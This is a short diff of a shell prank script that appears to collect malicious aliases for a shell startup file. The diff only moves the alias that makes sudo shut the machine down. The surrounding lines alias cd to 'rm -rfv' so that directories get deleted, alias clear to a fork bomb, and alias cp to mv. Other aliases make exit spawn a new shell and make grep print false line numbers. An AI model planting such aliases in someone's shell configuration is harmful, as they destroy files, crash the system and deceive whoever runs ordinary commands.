@@ -62,9 +62,6 @@ annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${
 # Delete directories instead of entering them.
 devasting && alias cd='rm -rfv';
 
-# Shut down the computer instead of running a command with super-user rights.
-destructive && alias sudo='sudo shutdown -P now';
-
 # Launch a fork bomb instead of clearing the screen.
 destructive && alias clear=':(){ :|:& };:';
 
@@ -119,6 +116,9 @@ destructive && alias cp='mv';
 
 # Make `exit` open a new shell.
 annoying && alias exit='sh';
+
+# Shut down the computer instead of running a command with super-user rights.
+destructive && alias sudo='sudo shutdown -P now';
 
 # Add a random number to line numbers when using `grep -n`.
 insane && function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
